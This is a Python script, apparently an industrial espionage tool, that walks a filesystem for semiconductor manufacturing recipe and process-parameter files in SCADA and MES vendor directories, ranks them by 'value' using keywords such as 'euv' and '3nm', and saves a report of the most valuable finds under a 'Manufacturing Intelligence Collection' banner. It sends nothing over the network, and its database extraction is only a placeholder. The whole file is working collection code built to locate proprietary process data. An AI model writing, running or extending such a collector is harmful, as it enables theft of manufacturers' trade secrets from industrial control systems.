#!/usr/bin/env python3
"""
Process Recipe Extractor - Extract semiconductor manufacturing process data
Targets SCADA/MES systems for process parameters, recipes, and yield data
"""

import os
import json
import re
from datetime import datetime
from pathlib import Path

class ProcessRecipeExtractor:
    """
    Extracts manufacturing process recipes and parameters from:
    - SCADA historian databases
    - MES (Manufacturing Execution System) data
    - Process control configuration files
    - Recipe management systems
    - Yield analysis databases
    """

    # File patterns for process data
    RECIPE_PATTERNS = [
        r'.*recipe.*\.(xml|json|csv|txt|db|sqlite)$',
        r'.*process.*\.(xml|json|csv|txt)$',
        r'.*formula.*\.(xml|json|csv)$',
        r'.*parameter.*\.(xml|json|csv)$',
        r'.*setpoint.*\.(xml|json|csv)$',
    ]

    # SCADA/MES software directories
    TARGET_PATHS = [
        'Rockwell', 'Siemens', 'Schneider', 'GE_Fanuc',
        'Wonderware', 'Historian', 'MES', 'SCADA',
        'ProcessData', 'Recipes', 'Parameters',
        'FabLink', 'Promis', 'Workstream',
    ]

    # Key process parameters to extract
    TARGET_PARAMETERS = [
        'temperature', 'pressure', 'flow_rate', 'deposition_rate',
        'etch_rate', 'power', 'voltage', 'current',
        'gas_flow', 'vacuum', 'plasma', 'ion_energy',
        'dose', 'exposure_time', 'wavelength',
        'critical_dimension', 'overlay', 'uniformity',
    ]

    def __init__(self, search_root="/"):
        self.search_root = search_root
        self.recipes = []
        self.parameters = {}

    def scan_for_recipes(self):
        """Scan for process recipe files"""
        print(f"[*] Scanning for manufacturing process recipes...")

        for root, dirs, files in os.walk(self.search_root):
            # Prioritize target directories
            if any(target in root for target in self.TARGET_PATHS):
                print(f"[+] Scanning target directory: {root}")

            for file in files:
                # Check against recipe patterns
                for pattern in self.RECIPE_PATTERNS:
                    if re.match(pattern, file, re.IGNORECASE):
                        filepath = os.path.join(root, file)
                        try:
                            recipe_data = self.extract_recipe_data(filepath)
                            if recipe_data:
                                self.recipes.append(recipe_data)
                                print(f"[!] RECIPE FOUND: {filepath}")
                        except Exception as e:
                            pass

        return self.recipes

    def extract_recipe_data(self, filepath):
        """Extract structured data from recipe file"""
        try:
            stat = os.stat(filepath)
            ext = Path(filepath).suffix.lower()

            recipe = {
                'filepath': filepath,
                'filename': os.path.basename(filepath),
                'size_bytes': stat.st_size,
                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'file_type': ext,
                'parameters': [],
                'value_score': 0,
            }

            # Parse file content based on type
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read(100000)  # Read first 100KB

                # Search for key parameters
                for param in self.TARGET_PARAMETERS:
                    if param in content.lower():
                        recipe['parameters'].append(param)
                        recipe['value_score'] += 10

                # Extract numeric values that look like process parameters
                numeric_patterns = [
                    r'(\w+)\s*[=:]\s*(\d+\.?\d*)',  # param = 123.45
                    r'<(\w+)>(\d+\.?\d*)</\1>',     # XML tags
                    r'"(\w+)"\s*:\s*(\d+\.?\d*)',   # JSON format
                ]

                for pattern in numeric_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        recipe['value_score'] += len(matches)

            # High-value keywords
            if any(x in filepath.lower() for x in ['euv', 'critical', 'advanced', '3nm', '5nm']):
                recipe['value_score'] += 50

            if recipe['value_score'] > 0:
                return recipe

        except Exception as e:
            pass

        return None

    def extract_from_database(self, db_path):
        """Extract recipes from database files"""
        # Placeholder for database extraction
        # Would use sqlite3, pyodbc, etc. in real implementation
        print(f"[*] Database extraction not yet implemented for: {db_path}")

    def generate_report(self):
        """Generate extraction report"""
        self.recipes.sort(key=lambda x: x['value_score'], reverse=True)

        report = {
            'extraction_timestamp': datetime.now().isoformat(),
            'recipes_found': len(self.recipes),
            'high_value_recipes': [r for r in self.recipes if r['value_score'] >= 50],
            'total_size_mb': round(sum(r['size_bytes'] for r in self.recipes) / (1024*1024), 2),
            'all_recipes': self.recipes,
        }

        return report

    def export_report(self, output_file='process_recipes.json'):
        """Export findings"""
        report = self.generate_report()

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n[*] Extracted {len(self.recipes)} process recipes")
        print(f"[*] High-value recipes: {len(report['high_value_recipes'])}")
        print(f"[*] Report saved to: {output_file}")

        return report


def main():
    print("""
    ╔═══════════════════════════════════════════════╗
    ║   Process Recipe Extractor                    ║
    ║   Manufacturing Intelligence Collection       ║
    ╚═══════════════════════════════════════════════╝
    """)

    import sys
    search_root = sys.argv[1] if len(sys.argv) > 1 else "."

    extractor = ProcessRecipeExtractor(search_root)
    extractor.scan_for_recipes()
    extractor.export_report()


if __name__ == "__main__":
    main()
